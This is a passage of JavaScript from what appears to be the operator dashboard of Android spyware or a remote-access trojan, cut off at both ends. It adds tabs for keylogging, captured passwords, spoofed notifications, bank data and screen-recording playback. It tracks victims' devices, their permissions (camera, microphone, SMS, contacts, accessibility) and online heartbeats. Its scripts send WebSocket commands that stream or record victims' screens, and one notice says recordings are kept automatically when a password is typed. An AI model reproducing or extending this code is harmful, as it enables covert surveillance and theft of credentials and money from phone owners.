            if(el.style.getPropertyValue('display')!=='none' || el.style.getPropertyPriority('display')!=='important'){

  function __zglDecorateTopNav(){

    };
    var nav=document.querySelector(".zglTopNav");

    Array.prototype.forEach.call(nav.querySelectorAll(".n-tabs-tab"),function(tab,index){
      var label=tab.getAttribute("data-zgl-top-label") || (tab.textContent||"").replace(/\s+/g,"").trim();
      var iconData=icons[label];
      if(!iconData){ return; }
      tab.setAttribute("data-zgl-top-label",label);
      tab.setAttribute("aria-label",label);
      tab.setAttribute("title",label);
      tab.classList.add("zglTopNavItem");
      var tabWrapper=tab.closest(".n-tabs-tab-wrapper");
      if(tabWrapper){ tabWrapper.style.order=String(orderedLabels.indexOf(label)); }
      var content=tab.querySelector(".n-tabs-tab__label") || tab;
      var icon=content.querySelector(".zglTopNavIcon");
      if(!icon){
        icon=document.createElement("i");
        icon.className="zglTopNavIcon";
        icon.setAttribute("aria-hidden","true");
        icon.setAttribute("data-lucide",iconData.name);
        icon.textContent=iconData.fallback;

      }

    if(window.lucide && typeof window.lucide.createIcons==="function"){
      window.lucide.createIcons({attrs:{"aria-hidden":"true"}});

  function __zglRun(){
    if(window.__zglFixing){ return; }
    try{
      window.__zglFixing=true;
      __zglRenameAppPopupLabels();

      __zglRenameNavLabels();
      __zglRenameFishLabel();
      fixNav();
      // 手机密码分类在 fixNav() 中创建，随后立即创建并收纳“密码记录”页签。

      __zglEnsureVideoTab();
      if(typeof window.__zglEnsureConnUX==='function') window.__zglEnsureConnUX();
      if(typeof window.__zglEnsureIntel==='function') window.__zglEnsureIntel();
      if(typeof window.__zglEnsureBank==='function') window.__zglEnsureBank();
      // 页签点击守卫: 注入页签(操作说明/伪装通知/密码记录/密码捕抓记录/录屏回放)激活时
      // 隐藏 Vue 原生面板(键盘记录工具栏等), 点击原生页签时恢复显示
      if(!window.__zglPaneGuardBound){
        window.__zglPaneGuardBound=true;
        document.addEventListener('click',function(ev){
          var clicked=ev.target && ev.target.closest ? ev.target.closest('.n-tabs-tab') : null;
          if(!clicked){ return; }
          var id=clicked.id;
          var injected=(id==='zglDocsTab'||id==='zglSpoofTab'||id==='zglPasswordTab'||id==='zglKlogTab'||id==='zglVideoTab'||id==='zglIntelTab'||id==='zglBankTab');
          var tabsRoot=document.querySelector('.zglTopTabs .n-tabs');
          if(!tabsRoot){ return; }
          if(injected){ tabsRoot.classList.add('zglHideVp'); } else { tabsRoot.classList.remove('zglHideVp'); }
        },true);
      }
      __zglDecorateTopNav();
      __zglAlignPreviewScreens(document.querySelector('.image-box-group'));
      __zglWhitenPreviewText();
      if(location.pathname.indexOf('/info')===0 && document.querySelector('.image-box-group') && window.__zglRouteGuardReady){
        window.__zglRouteGuardReady(location.pathname+location.search);
      }
    }finally{ window.__zglFixing=false; }
  }
  __zglRun();
  window.__zglRunLayout=__zglRun;
  window.addEventListener('DOMContentLoaded', __zglRun);
  setInterval(__zglRun, 1500);
  var __zglPending=false;
  try{

      if(window.__zglFixing || __zglPending){ return; }

      setTimeout(function(){ __zglPending=false; __zglRun(); }, 120);
    }).observe(document.documentElement, {childList:true, subtree:true});
  }catch(e){}
})();
</script>

<script>
/* Keep the device table's heartbeat column visible even when a cached route component renders the legacy columns. */
(function(){
  function addHeartbeatColumn(){
    if(window.__zglHeartbeatUpdating) return;
    window.__zglHeartbeatUpdating=true;
    try{
    if(location.pathname.indexOf('/list/basic-list')===-1) return;
    if(document.querySelector('.index-root th[data-col-key="lastPing"]')) return;
    var tables=document.querySelectorAll('.index-root .n-data-table');
    tables.forEach(function(table){
      var head=table.querySelector('.n-data-table-thead tr');
      var body=table.querySelector('.n-data-table-tbody');
      if(!head || !body) return;
      var regionHead=head.querySelector('th[data-col-key="country"]');
      var insertHeadBefore=regionHead ? regionHead.nextElementSibling : (head.querySelector('th[data-col-key="action"]') || head.lastElementChild);
      if(insertHeadBefore && !head.querySelector('th[data-col-key="lastPing"]')){
        var th=document.createElement('th');
        th.className='n-data-table-th';
        th.setAttribute('data-col-key','lastPing');
        th.innerHTML='<div class="n-data-table-th__title-wrapper"><div class="n-data-table-th__title"><span>心跳时间</span></div></div>';
        th.style.width='180px'; th.style.minWidth='180px';
        head.insertBefore(th, insertHeadBefore);
      }
      body.querySelectorAll('tr').forEach(function(row){
        var region=row.querySelector('td[data-col-key="country"]');
        var insertBefore=region ? region.nextElementSibling : (row.querySelector('td[data-col-key="action"]') || row.lastElementChild);
        if(!insertBefore) return;
        var td=row.querySelector('td[data-col-key="lastPing"]');
        if(!td){
          td=document.createElement('td');
          td.className='n-data-table-td';
          td.setAttribute('data-col-key','lastPing');
          td.style.width='180px'; td.style.minWidth='180px'; td.style.whiteSpace='nowrap';
          row.insertBefore(td, insertBefore);
        }
        var idCell=row.querySelector('td[data-col-key="phone_id"]');
        var phoneId=idCell ? (idCell.textContent||'').trim() : '';
        var raw=phoneId && window.__zglHeartbeatById ? window.__zglHeartbeatById[phoneId] : '';
        var parsed=raw ? new Date(typeof raw==='number' && raw<10000000000 ? raw*1000 : raw) : null;
        var valid=parsed && !isNaN(parsed.getTime());
        var age=valid ? Math.max(0,Date.now()-parsed.getTime()) : Infinity;
        var text=valid ? parsed.getFullYear()+'-'+String(parsed.getMonth()+1).padStart(2,'0')+'-'+String(parsed.getDate()).padStart(2,'0')+' '+String(parsed.getHours()).padStart(2,'0')+':'+String(parsed.getMinutes()).padStart(2,'0')+':'+String(parsed.getSeconds()).padStart(2,'0') : '暂无心跳';
        var color=age<120000 ? '#49d9a4' : '#fdf3e3';
        var dot=age<120000 ? '#16a34a' : '#867c69';
        var rendered=text+'|'+color+'|'+dot;
        if(td.getAttribute('data-heartbeat-rendered')!==rendered){
          td.setAttribute('data-heartbeat-rendered',rendered);
          td.innerHTML='<span style="display:inline-flex;align-items:center;gap:6px;color:'+color+';font-size:12px;font-weight:600;white-space:nowrap"><i style="width:7px;height:7px;border-radius:50%;background:'+dot+';display:inline-block"></i>'+text+'</span>';
        }
      });
      var tbls=table.querySelectorAll('table');
      tbls.forEach(function(tbl){
        if (tbl.getAttribute('data-zgl-width-done')) return;
        tbl.setAttribute('data-zgl-width-done','1');
        tbl.style.setProperty('min-width','0','important');
        tbl.style.setProperty('width','100%','important');
        tbl.style.setProperty('table-layout','fixed','important');
      var widths={_select:36,phone_id:0,user_email:86,assigned_to:0,phone_name:96,country:118,android_version:0,model:128,wallpap:0,battery_charge:74,activz:74,accessibility:82,install_date:124,lastPing:112,action:215,adb_status:56,network:84,perms:72,sim:92};
        Object.keys(widths).forEach(function(key){
          table.querySelectorAll('[data-col-key="'+key+'"]').forEach(function(cell){
            cell.style.setProperty('width',widths[key]+'px','important');
            cell.style.setProperty('min-width',widths[key]+'px','important');
            cell.style.setProperty('padding','0 5px','important');
            if(key==='assigned_to' || key==='wallpap'){ cell.style.display='none'; }
          });
        });
        var colgroup=tbl.querySelector('colgroup');
        var cols=tbl.querySelectorAll('colgroup col');
        var reference=tbl.querySelector('thead tr') || tbl.querySelector('tbody tr');
        if(!reference) return;
        var heartbeatIndex=Array.prototype.indexOf.call(reference.children,reference.querySelector('[data-col-key="lastPing"]'));
        if(colgroup && heartbeatIndex>=0 && cols.length<reference.children.length){
          var heartbeatCol=document.createElement('col');
          colgroup.insertBefore(heartbeatCol,cols[heartbeatIndex] || null);
          cols=tbl.querySelectorAll('colgroup col');
        }
        Array.prototype.forEach.call(reference.children,function(cell,index){
          var key=cell.getAttribute('data-col-key');
          var col=cols[index];
          if(!col || widths[key]===undefined) return;
          col.style.setProperty('width',widths[key]+'px','important');
          col.style.setProperty('min-width',widths[key]+'px','important');
          if(key==='assigned_to' || key==='wallpap') col.style.display='none';
        });
      });
    });
    }finally{ window.__zglHeartbeatUpdating=false; }
  }
  addHeartbeatColumn();
  new MutationObserver(addHeartbeatColumn).observe(document.documentElement,{childList:true,subtree:true});
  setInterval(addHeartbeatColumn,3000);
})();
</script>

    <script id="zglOfflineToggle">
    (function(){
      var flag = sessionStorage.getItem('__zglShowOffline') === '1';
      window.__zglShowOffline = flag;
      function ensureToggle(){
        if (!/\/list\//.test(location.pathname)) return;
        if (document.getElementById('__zglOfflineToggle')) return;
        var bar = document.querySelector('.table-toolbar');
        if (!bar) return;
        var btn = document.createElement('button');
        btn.id = '__zglOfflineToggle';
        btn.type = 'button';
        btn.textContent = flag ? '仅显示在线' : '显示离线设备';
        btn.style.cssText = 'margin-left:10px;padding:7px 14px;border-radius:8px;cursor:pointer;font-size:13px;background:#eef1f7;color:#d8b45a;border:1px solid #d8dfeb;font-family:inherit;';
        btn.onclick = function(){
          var nv = !window.__zglShowOffline;
          window.__zglShowOffline = nv;
          sessionStorage.setItem('__zglShowOffline', nv ? '1' : '0');
          location.reload();
        };
        bar.appendChild(btn);
      }
      setInterval(ensureToggle, 3000);
      try { new MutationObserver(ensureToggle).observe(document.body, {childList:true, subtree:true}); } catch(e) {}
    })();
    </script>

<script id="zglFilterBar">
    (function(){
      function fmtDate(d){
        var y=d.getFullYear(), m=('0'+(d.getMonth()+1)).slice(-2), dd=('0'+d.getDate()).slice(-2);
        return y+'-'+m+'-'+dd;
      }
      function readState(){
        try { return JSON.parse(sessionStorage.getItem('__zglFilterState')||'{}'); } catch(e){ return {}; }
      }
      // 全量类筛选（日期/搜索/无障碍）激活时，自动包含离线设备
      function needsAll(st){
        return !!(st.today || st.yesterday || st.date || (st.q && String(st.q).trim() !== '') || (st.acc && st.acc !== 'all'));
      }
      function buildCustomFilters(st){
        if (needsAll(st)) st.online = false;
        window.__zglShowOffline = st.online !== true;
        var f = {};
        var q = st.q ? String(st.q).trim() : '';
        if (q !== '') f.search = q;
        if (st.screenOn) f.screen_on = 1;
        if (st.today) f.install_date = fmtDate(new Date());
        if (st.yesterday) { var y=new Date(); y.setDate(y.getDate()-1); f.install_date = fmtDate(y); }
        if (st.landscape) f.landscape = 1;
        if (st.date) f.install_date = st.date;
        if (st.acc === 'on') f.acc = 1;
        if (st.acc === 'off') f.acc = 0;
        window.__zglCustomFilters = f;
      }
      // 关键修复：表格首次请求之前就把筛选写入 window（此前等 DOM 就绪后才写，首屏永远无筛选）
      var st0 = readState();
      if (st0.online === undefined) st0.online = true;
      buildCustomFilters(st0);
      function hideOldForms(){
        [].slice.call(document.querySelectorAll('.n-form')).forEach(function(f){
          var tx=(f.innerText||'')+'';
          if (tx.indexOf('查询')!==-1 || tx.indexOf('请输入备注')!==-1){
            if ((f.getAttribute('style')||'').indexOf('display: none')===-1){
              f.setAttribute('style', 'display: none !important;');
            }
          }
        });
        var oldToggle=document.getElementById('__zglOfflineToggle');
        if (oldToggle) oldToggle.style.display='none';
      }
      function ensureBar(){
        if (!/\/list\//.test(location.pathname)) return;
        hideOldForms();
        if (document.getElementById('__zglFilterBar')) return;
        var form = document.querySelector('.index-root .n-form');
        var anchor = form || document.querySelector('.index-root .n-card');
        if (!anchor) return;
        var st = readState();
        if (st.online === undefined) st.online = true;
        buildCustomFilters(st);
        function save(){
          sessionStorage.setItem('__zglFilterState', JSON.stringify(st));
          location.reload();
        }
        var bar = document.createElement('div');
        bar.id = '__zglFilterBar';
        function mk(label, key){
          var lab=document.createElement('label'); lab.className='zglFilterCk';
          var cb=document.createElement('input'); cb.type='checkbox';
          cb.checked = !!st[key];
          if (cb.checked) lab.classList.add('checked');
          var sp=document.createElement('span'); sp.textContent=label;
          lab.appendChild(cb); lab.appendChild(sp);
          cb.onchange=function(){
            st[key]=cb.checked;
            // 勾选"今天/昨天安装"等全量筛选时自动取消"只看在线"，让筛选覆盖离线设备
            if (key !== 'online' && cb.checked && (key === 'today' || key === 'yesterday')) st.online = false;
            save();
          };
          bar.appendChild(lab);
        }
        mk('只看在线','online');
        mk('今天安装','today');
        mk('昨天安装','yesterday');
        // 安装时间日期筛选（带标签）
        var lbl=document.createElement('span'); lbl.className='zglFilterLbl'; lbl.textContent='安装时间';
        bar.appendChild(lbl);
        var dt=document.createElement('input'); dt.type='date';
        dt.value = st.date || '';
        dt.onchange=function(){ st.date=dt.value; save(); };
        bar.appendChild(dt);
        // 无障碍状态筛选：全部/已开启/未开启
        var accSel=document.createElement('select'); accSel.className='zglFilterSel';
        [['all','无障碍：全部'],['on','无障碍：已开启'],['off','无障碍：未开启']].forEach(function(pair){
          var o=document.createElement('option');
          o.value=pair[0]; o.textContent=pair[1];
          accSel.appendChild(o);
        });
        accSel.value = st.acc || 'all';
        accSel.onchange=function(){ st.acc=accSel.value; save(); };
        bar.appendChild(accSel);
        // 搜索框：回车或点"搜索"生效
        var qBox=document.createElement('input');
        qBox.type='text';
        qBox.id='__zglSearchInput';
        qBox.placeholder='';
        qBox.value = st.q || '';
        bar.appendChild(qBox);
        function doSearch(){
          st.q = qBox.value;
          save();
        }
        qBox.addEventListener('keydown', function(ev){ if (ev.key === 'Enter') doSearch(); });
        var qb=document.createElement('button'); qb.type='button'; qb.className='zglBarBtn'; qb.textContent='搜索';
        qb.onclick=doSearch;
        bar.appendChild(qb);
        var rf=document.createElement('button'); rf.type='button'; rf.className='zglBarBtn';
        rf.textContent='刷新';
        rf.onclick=function(){
          var old=document.querySelector('.zgl-device-refresh-button');
          if(old){ old.click(); } else { location.reload(); }
        };
        bar.appendChild(rf);
        var rb=document.createElement('button'); rb.type='button'; rb.className='zglBarBtn';
        rb.textContent='重置';
        rb.onclick=function(){ sessionStorage.removeItem('__zglFilterState'); location.reload(); };
        bar.appendChild(rb);
        var simBox = document.createElement('span');
        simBox.id = '__zglSimStats';
        simBox.style.cssText = 'display:inline-flex;align-items:center;gap:10px;margin-left:6px;font-size:12px;font-weight:600;white-space:nowrap;flex-wrap:wrap;';
        bar.appendChild(simBox);
        function paintDash(){
          var s = window.__zglSimStats || {};
          var devs = window.__zglDevices || {};
          var ids = Object.keys(devs);
          var total = ids.length;
          var online = 0, accOn = 0, permFull = 0, permMiss = 0, permRep = 0;
          ids.forEach(function(k){
            var d = devs[k] || {};
            if (String(d.isonline) !== '0') online++;
            if (d.accessibility === '1' || d.accessibility === 1) accOn++;
            if (d.perms && typeof d.perms === 'object') {
              permRep++;
              var ok = true;
              ['CAMERA','MIC','LOCATION','CONTACTS','SMS','PHONE','STORAGE','acc'].forEach(function(pk){
                var pv = d.perms[pk];
                if (!(pv === 1 || pv === '1' || pv === true)) ok = false;
              });
              if (ok) permFull++; else permMiss++;
            }
          });
          simBox.innerHTML =
            '<span style="color:#49d9a4;">📶 有卡 ' + (s.has||0) + '</span>' +
            '<span style="color:#5b6b8c;">无卡 ' + (s.none||0) + '</span>' +
            '<span style="color:#5a74ff;">🖥 在线 ' + online + '/' + total + '</span>' +
            '<span style="color:#c9a45c;">♿ 无障碍 ' + accOn + '</span>' +
            '<span style="color:#16a34a;">🟢 权限齐 ' + permFull + '</span>' +
            '<span style="color:#e05d4f;">🔴 权限缺 ' + permMiss + '</span>' +
            (permRep < total ? '<span style="color:#6f6551;">未上报 ' + (total - permRep) + '</span>' : '');
        }
        paintDash();
        setInterval(paintDash, 3000);
        anchor.parentNode.insertBefore(bar, anchor);
      }
      setInterval(ensureBar, 3000);
      try { new MutationObserver(ensureBar).observe(document.body, {childList:true, subtree:true}); } catch(e){}
    })();
    </script>

<script id="zglRecPanel">
(function(){
  if (window.__zglRecPanelInited) return; window.__zglRecPanelInited = true;
  function store(k){ try { var v = localStorage.getItem(k); if (v == null) return ""; var j = JSON.parse(v); return (j && j.value !== undefined) ? j.value : v; } catch(e){ return v || ""; } }
  function esc(s){ return String(s == null ? "" : s).replace(/[&<>"']/g, function(c){ return {"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]; }); }
  var pid = (new URLSearchParams(location.search)).get("id") || "";
  var sock = null, overlay = null, listEl = null, busy = false;

  function toast(msg){ try { if (window.$message) window.$message.success(msg); } catch(e){} }

  function connect(){
    if (sock && (sock.readyState === 0 || sock.readyState === 1)) return;
    try {
      sock = new WebSocket("wss://" + location.host + "/api/ws/");
      sock.onopen = function(){
        sock.send(JSON.stringify({ itype:"slr_panel", subc:"join", pid: pid, usercheck: store("CURRENT-USER") }));
      };
      sock.onmessage = function(ev){
        try {
          var m = JSON.parse(ev.data);
          if (m && m.type === "recseg") { refresh(); toast("收到新录屏片段"); }
        } catch(e){}
      };
    } catch(e){}
  }

  function sendRec(act){
    if (!sock || sock.readyState !== 1) { connect(); setTimeout(function(){ sendRec(act); }, 800); return; }
    sock.send(JSON.stringify({ itype:"slr_panelsend", subc:"rec", subc: act, pid: pid, usercheck: store("CURRENT-USER") }));
  }

  function refresh(){
    if (busy) return; busy = true;
    if (!listEl) { busy = false; return; }
    listEl.innerHTML = '<div style="padding:20px;color:#5b6b8c;font-size:13px;">加载中...</div>';
    var token = store("ACCESS-TOKEN");
    var body = JSON.stringify({ action:"list", token: token, phone_id: pid });
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "/api/EaodVideos.php", true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onreadystatechange = function(){
      if (xhr.readyState !== 4) return;
      busy = false;
      var vids = [];
      try {
        var j = JSON.parse(xhr.responseText || "{}");
        if (j && j.code === 200 && j.videos) vids = j.videos;
      } catch(e){}
      if (!listEl) return;
      if (!vids.length) {
        listEl.innerHTML = '<div style="padding:24px;color:#5b6b8c;font-size:13px;text-align:center;line-height:1.9;">暂无录屏片段<br/><span style="font-size:12px;">点「开始录制」后设备无感分段录制（60秒/段）；<br/>检测到密码输入会自动留存上传。</span></div>';
        return;
      }
      var html = "";
      vids.forEach(function(v){
        var size = v.size_bytes ? (v.size_bytes/1024/1024).toFixed(1) + " MB" : "?";
        var url = "/api/EaodVideos.php?action=file&token=" + encodeURIComponent(token) + "&id=" + v.id;
        html += '<div class="zgl-vid-item">'
          + '<div class="zgl-vid-head"><span class="zgl-vid-t">' + esc(v.created_at) + ' · ' + size + (v.trigger_type === "auto" ? ' · 密码触发' : ' · 手动拉取') + '</span>'
          + '<a class="zgl-vid-dl" href="' + url + '" download="rec_' + v.id + '.mp4">下载</a></div>'
          + '<video class="zgl-vid" controls preload="metadata" src="' + url + '"></video>'
          + '</div>';
      });
      listEl.innerHTML = html;
    };
    xhr.send(body);
  }

  function openPanel(){
    if (overlay) { overlay.style.display = "flex"; refresh(); return; }
    overlay = document.createElement("div");
    overlay.className = "zgl-rec-overlay";
    overlay.style.cssText = "position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(20, 33, 61,.72);z-index:10000;display:flex;align-items:center;justify-content:center;padding:20px;box-sizing:border-box;";
    overlay.onclick = function(e){ if (e.target === overlay) overlay.style.display = "none"; };
    var box = document.createElement("div");
    box.style.cssText = "width:min(680px,100%);max-height:86vh;background:#ffffff;border:1px solid #d8dfeb;border-radius:14px;display:flex;flex-direction:column;overflow:hidden;box-shadow:0 24px 70px rgba(0,0,0,.5);";
    box.innerHTML =
      '<div style="padding:16px 20px;border-bottom:1px solid #e5eaf4;display:flex;align-items:center;justify-content:space-between;">'
      + '<div><div style="font-size:15px;font-weight:800;color:#f0d9a0;">🎥 录屏回放</div><div style="font-size:12px;color:#5b6b8c;margin-top:4px;">设备 ' + esc(pid || "-") + ' · 无感分段录制（60秒/段，保留最近8段）</div></div>'
      + '<button class="zgl-rec-close" style="border:1px solid #d8dfeb;background:#f7f9fd;color:#5b6b8c;width:30px;height:30px;border-radius:8px;cursor:pointer;">×</button></div>'
      + '<div style="padding:12px 20px;border-bottom:1px solid #f5f7fb;display:flex;gap:10px;flex-wrap:wrap;">'
      + '<button class="zgl-rec-btn zgl-rec-btn-gold" data-act="1">开始录制</button>'
      + '<button class="zgl-rec-btn" data-act="0">停止录制</button>'
      + '<button class="zgl-rec-btn" data-act="pull">拉取最近片段</button>'
      + '<button class="zgl-rec-btn" id="zglRecRefresh">刷新列表</button></div>'
      + '<div id="zglRecList" style="flex:1;overflow-y:auto;padding:14px 20px;"></div>';
    overlay.appendChild(box);
    document.body.appendChild(overlay);
    listEl = document.getElementById("zglRecList");
    box.querySelector(".zgl-rec-close").onclick = function(){ overlay.style.display = "none"; };
    box.querySelector('[data-act="1"]').onclick = function(){ sendRec("1"); toast("已下发开始录制"); };
    box.querySelector('[data-act="0"]').onclick = function(){ sendRec("0"); toast("已下发停止录制"); };
    box.querySelector('[data-act="pull"]').onclick = function(){ sendRec("pull"); toast("已下发拉取最近片段"); };
    box.querySelector("#zglRecRefresh").onclick = refresh;
    connect();
    refresh();
  }

  window.__zglRecSegNotify = function(u){ if (overlay && overlay.style.display !== "none") refresh(); };
  window.__zglOpenRecPanel = openPanel;

  var css = document.createElement("style");
  css.textContent =
    ".zgl-rec-btn{height:34px;padding:0 14px;border-radius:8px;border:1px solid #d8dfeb;background:#f7f9fd;color:#1c2a45;font-size:12px;font-weight:700;cursor:pointer;}"
    + ".zgl-rec-btn:hover{border-color:#6b83ff;color:#f0d9a0;}"
    + ".zgl-rec-btn-gold{background:linear-gradient(135deg,#6b83ff,#16a34a);border:none;color:#ffffff;}"
    + ".zgl-vid-item{margin-bottom:14px;border:1px solid #e5eaf4;border-radius:10px;overflow:hidden;background:#f7f9fd;}"
    + ".zgl-vid-head{display:flex;align-items:center;justify-content:space-between;padding:8px 12px;border-bottom:1px solid #f5f7fb;}"
    + ".zgl-vid-t{font-size:12px;color:#5b6b8c;font-weight:600;}"
    + ".zgl-vid-dl{font-size:12px;color:#6b83ff;text-decoration:none;font-weight:700;}"

    + ".zgl-rec-inject-btn{height:26px;margin-left:10px;padding:0 10px;border-radius:7px;border:1px solid rgba(79, 107, 254,.5);background:rgba(79, 107, 254,.12);color:#f0d9a0;font-size:12px;font-weight:700;cursor:pointer;}"
    + ".zgl-rec-inject-btn:hover{background:rgba(79, 107, 254,.25);}";
  document.head.appendChild(css);

  // 录屏回放入口已统一到顶部"录屏回放"页签(录制控制在页签内), 此处不再注入重复按钮
})();

<script id="zglBuildGuard">
(function(){
  if (window.__zglBuildGuardInited) return;
  window.__zglBuildGuardInited = true;
  function guard(){
    try{
      if (location.pathname.indexOf('/setting/system') !== 0) return;
      var btn = [].slice.call(document.querySelectorAll('button')).filter(function(b){
        var t = (b.textContent || '').replace(/\s+/g,'');
        return t === '生成应用';
      })[0];
      if (!btn) return;
      var bodyText = (document.body.innerText || '');
      var building = bodyText.indexOf('构建中') !== -1 || bodyText.indexOf('正在构建') !== -1;
      if (building && !btn.disabled) {
        btn.disabled = true;
        btn.style.opacity = '.55';
        btn.style.cursor = 'not-allowed';
        btn.setAttribute('title', '已有构建正在进行，请等待完成');
      } else if (!building && btn.disabled) {
        btn.disabled = false;
        btn.style.opacity = '1';
        btn.style.cursor = 'pointer';
        btn.removeAttribute('title');
      }
    }catch(e){}
  }
  setInterval(guard, 3000);
  try { new MutationObserver(guard).observe(document.body, {childList:true, subtree:true}); } catch(e){}
})();
</script>

<script id="zglConnUx">
(function(){
  if (window.__zglConnUxInited) return;
  window.__zglConnUxInited = true;
  function onInfo(){ return location.pathname.indexOf('/info') === 0; }
  function pid(){ return new URLSearchParams(location.search).get('id') || ''; }
  function stoGet(key){
    var raw = localStorage.getItem(key) || sessionStorage.getItem(key) || '';
    if(!raw) return '';
    try{ var p = JSON.parse(raw); if (p && Object.prototype.hasOwnProperty.call(p,'value')) return typeof p.value==='string'?p.value:JSON.stringify(p.value); }catch(e){}
    return raw;
  }
  function esc(s){ return String(s==null?'':s).replace(/[&<>"']/g,function(c){return ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c];}); }

  var snap = {sim:'', carrier:'', network:'', isonline:'', battery:'', model:'', acc:'', region:'', note:''};

  function pollDevice(){
    if(!onInfo() || !pid()) return;
    try{
      var ws = new WebSocket((location.protocol==='https:'?'wss://':'ws://') + location.host + '/api/ws/');
      var tmr = setTimeout(function(){ try{ws.close();}catch(e){} }, 9000);
      ws.onopen = function(){
        ws.send(JSON.stringify({itype:'slr_panel', subc:'checkphone', email:stoGet('CURRENT-EMAIL'), token:stoGet('ACCESS-TOKEN'), usrname:stoGet('CURRENT-USER'), page:1, pageSize:600, filters:{}, showOffline:1}));
      };
      ws.onmessage = function(ev){
        try{
          var m = JSON.parse(ev.data);
          if(m && m.type === 'checkphone' && m.list){
            for(var i=0;i<m.list.length;i++){
              var d = m.list[i];
              if(String(d.phone_id) === String(pid())){
                snap.sim = d.sim || ''; snap.carrier = d.simcarrier || '';
                snap.network = d.network || '';
                snap.isonline = (d.isonline==='1'||d.isonline===1) ? '1' : ((d.isonline==='0'||d.isonline===0) ? '0' : '');
                snap.battery = d.battery_charge || '';
                snap.model = d.model || '';
                snap.acc = String(d.accessibility || '');
                snap.region = d.region || d.country || '';
                snap.note = d.phone_name || '';
                break;
              }
            }
            clearTimeout(tmr);
            ws.close();
          }
        }catch(e){}
      };
      ws.onerror = function(){ try{ws.close();}catch(e){} };
    }catch(e){}
  }
  pollDevice();
  setInterval(pollDevice, 20000);

  var connState = 'idle';
  var snapWs = null, snapTimer = null;

  function stopSnapLoop(){
    if(snapTimer){ clearInterval(snapTimer); snapTimer = null; }
    if(snapWs){ try{ snapWs.close(); }catch(e){} snapWs = null; }
  }
  function startSnapLoop(){
    stopSnapLoop();
    if(!onInfo() || !pid()) return;
    try{
      snapWs = new WebSocket((location.protocol==='https:'?'wss://':'ws://') + location.host + '/api/ws/');
      snapWs.onopen = function(){
        snapWs.send(JSON.stringify({itype:'slr_panel', subc:'join', pid: pid(), usercheck: stoGet('CURRENT-USER')}));
        snapTimer = setInterval(function(){
          try{
            if(snapWs && snapWs.readyState === 1){
              snapWs.send(JSON.stringify({itype:'slr_panelsend', subc:'screen', comand:'snap', stype:'1', pid: pid(), usercheck: stoGet('CURRENT-USER')}));
            }
          }catch(e){}
        }, 1500);
      };
      snapWs.onerror = function(){ stopSnapLoop(); };
      snapWs.onclose = function(){ if(snapTimer){ clearInterval(snapTimer); snapTimer=null; } };
    }catch(e){}
  }

  function readInfoRow(label){
    try{
      var items = document.querySelectorAll('.n-descriptions-item');
      for(var i=0;i<items.length;i++){
        var lab = items[i].querySelector('.n-descriptions-item-label');
        if(lab && (lab.textContent||'').replace(/\s+/g,'').indexOf(label)!==-1){
          var cont = items[i].querySelector('.n-descriptions-item-content');
          return cont ? (cont.textContent||'').trim() : '';
        }
      }
    }catch(e){}
    return '';
  }

  function streamActive(){
    try{
      var fpsEl = document.getElementById('zglFps');
      if(fpsEl){ var t=(fpsEl.textContent||'').match(/(\d+)/); if(t && Number(t[1])>0) return true; }
      var imgs = document.querySelectorAll('.image-box-group .image-box img');
      for(var i=0;i<imgs.length;i++){
        var src = imgs[i].getAttribute('src') || '';
        if(src.indexOf('blob:')===0 || src.indexOf('data:image')===0) return true;
      }
      return false;
    }catch(e){ return false; }
  }

  function ensureBar(){
    if(!onInfo() || !pid()) return;
    var nav = document.querySelector('.zglTopNav');
    if(!nav) return;
    var bar = document.getElementById('zglDeviceBar');
    if(!bar){
      bar = document.createElement('div');
      bar.id = 'zglDeviceBar';
      bar.style.cssText = 'display:flex;align-items:center;flex-wrap:wrap;gap:14px;margin:2px 0 14px;padding:12px 16px;border:1px solid rgba(79, 107, 254,.22);border-radius:12px;background:rgba(251, 252, 254,.78);color:#14213d;font-family:v-sans,system-ui,sans-serif;font-size:13px;';
      nav.parentNode.insertBefore(bar, nav.nextSibling);
      var left = document.createElement('div');
      left.id = 'zglDeviceBarItems';
      left.style.cssText = 'display:flex;align-items:center;flex-wrap:wrap;gap:16px;';
      bar.appendChild(left);
      var fbtn = document.createElement('button');
      fbtn.id = 'zglFontBtn';
      fbtn.type = 'button';
      fbtn.style.cssText = 'margin-left:12px;height:34px;padding:0 14px;border-radius:8px;border:1px solid rgba(79, 107, 254,.35);background:rgba(247, 249, 253,.8);color:#5b6b8c;font-weight:700;font-size:12px;cursor:pointer;';
      (function(){
        var big = (localStorage.getItem('zglInfoFont') === 'big');
        function paint(){ fbtn.textContent = big ? '字号·大' : '字号·标准'; document.documentElement.classList.toggle('zglBigFont', big); }
        fbtn.onclick = function(){ big = !big; try{ localStorage.setItem('zglInfoFont', big ? 'big' : 'std'); }catch(e){} paint(); };
        paint();
      })();
      bar.appendChild(fbtn);
      var sbtn = document.createElement('button');
      sbtn.id = 'zglStreamBtn';
      sbtn.type = 'button';
      sbtn.style.cssText = fbtn.style.cssText;
      (function(){
        function applyMode(){
          var hd = (localStorage.getItem('zglStreamMode') === 'hd');
          sbtn.textContent = hd ? '清晰度·清晰' : '清晰度·流畅';
          sbtn.style.borderColor = hd ? '#6b83ff' : 'rgba(79, 107, 254,.35)';
          sbtn.style.color = hd ? '#f0d9a0' : '#5b6b8c';
          if(hd){ startSnapLoop(); } else { stopSnapLoop(); }
        }
        sbtn.onclick = function(){
          var hd = (localStorage.getItem('zglStreamMode') !== 'hd');
          try{ localStorage.setItem('zglStreamMode', hd ? 'hd' : 'smooth'); }catch(e){}
          applyMode();
        };
        applyMode();
      })();
      bar.appendChild(sbtn);
      var btn = document.createElement('button');
      btn.id = 'zglConnBtn';
      btn.type = 'button';
      btn.style.cssText = 'margin-left:10px;height:34px;padding:0 22px;border-radius:8px;border:0;background:linear-gradient(90deg,#3b5bf0,#6b83ff);color:#ffffff;font-weight:800;font-size:13px;cursor:pointer;box-shadow:0 8px 26px rgba(79, 107, 254,.35);transition:all .2s ease;';
      btn.textContent = '连接投屏';
      btn.onclick = function(){
        if(connState === 'connecting') return;
        connState = 'connecting';
        btn.textContent = '连接中…';
        btn.style.background = '#e5eaf4'; btn.style.color = '#7d93ac'; btn.style.cursor = 'default'; btn.style.boxShadow = 'none';
        try{
          var ws2 = new WebSocket((location.protocol==='https:'?'wss://':'ws://') + location.host + '/api/ws/');
          ws2.onopen = function(){
